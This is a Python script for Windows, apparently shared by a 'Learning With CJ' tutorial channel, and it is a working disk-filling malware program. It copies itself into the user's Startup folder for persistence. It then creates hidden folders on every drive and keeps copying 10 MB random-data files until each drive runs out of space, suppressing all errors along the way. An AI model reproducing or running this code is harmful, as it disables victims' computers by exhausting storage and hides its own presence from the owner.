#
#  _                                _                __          __ _  _    _        _____      _ 
# | |                              (_)               \ \        / /(_)| |  | |      / ____|    | |
# | |      ___   __ _  _ __  _ __   _  _ __    __ _   \ \  /\  / /  _ | |_ | |__   | |         | |
# | |     / _ \ / _` || '__|| '_ \ | || '_ \  / _` |   \ \/  \/ /  | || __|| '_ \  | |     _   | |
# | |____|  __/| (_| || |   | | | || || | | || (_| |    \  /\  /   | || |_ | | | | | |____| |__| |
# |______|\___| \__,_||_|   |_| |_||_||_| |_| \__, |     \/  \/    |_| \__||_| |_|  \_____|\____/ 
#                                              __/ |                                              
#                                             |___/                         -  By CJ
#
# YouTube : www.youtube.com/@LearningWithCJ
# GitHub  : www.github.com/Carl-Johnson1976
# Telegram: t.me/LearningWithCJ
#

import os
import sys
import shutil
import ctypes
import win32api
import subprocess



class CopyANDPaste():
    def __init__(self):
        self.extra_num = 0
        self.file_size = 10 # enter file size in MB
        self.folder_name = "LearningWithCJ" # enter folder name
        self.file_name = "CJ" # enter file name
        self.mega_byte = 1_000_000 # dont change
        self.finall = 1000 * self.file_size
        self.set_file()

    def set_file(self):
        try:
            user = os.path.expanduser('~').split('\\')[-1]
            src_path = sys.argv[0].replace("/", "\\")
            dst_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\copyandpaste.py"
            if os.path.exists(dst_path):
                self.get_drives()
            else:
                shutil.copy(src_path, dst_path)
                self.get_drives()
        except:
            self.get_drives()

    def get_drives(self):
        try:
            self.drives = win32api.GetLogicalDriveStrings()
            self.drives = self.drives.split('\000')[:-1]
            self.drives_len = len(self.drives)
            self.create_file()
        except:
            sys.exit()

    def create_file(self):
        try:
            for i in range(self.drives_len):
                self.num = i
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(self.drives[i]), None, None, ctypes.pointer(free_bytes))
                if free_bytes.value >= self.finall:
                    if i == self.drives_len:
                        i = 0
                    fact = True
                    while fact:
                        self.dst_path = f'{self.drives[i][:-1]}/{self.folder_name}_{self.extra_num}'
                        if os.path.exists(self.dst_path):
                            self.extra_num += 1
                        else:
                            self.dst_path = f'{self.drives[i][:-1]}/{self.folder_name}_{self.extra_num}'
                            os.mkdir(self.dst_path)
                            self.create_note()
                else:
                    if i == self.drives_len:
                        i = 0
                    continue
        except:
            sys.exit()

    def create_note(self):
        try:
            subprocess.check_call(["attrib", "+h", self.dst_path])
            self.file_address = f'{self.dst_path}/{self.file_name}_0.txt'
            with open(self.file_address, 'wb') as file:
                file.write(os.urandom(self.file_size * self.mega_byte))
            self.generate_file()
        except:
            sys.exit()

    def generate_file(self):
        try:
            text_num = 1
            while True:
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(self.drives[self.num]), None, None, ctypes.pointer(free_bytes))
                if free_bytes.value >= self.finall:
                    paste_address = f"{self.dst_path}/{self.file_name}_{text_num}.txt"
                    shutil.copy(self.file_address, paste_address)
                    text_num += 1
                else:
                    self.create_file()
        except:
            sys.exit()



CopyANDPaste()
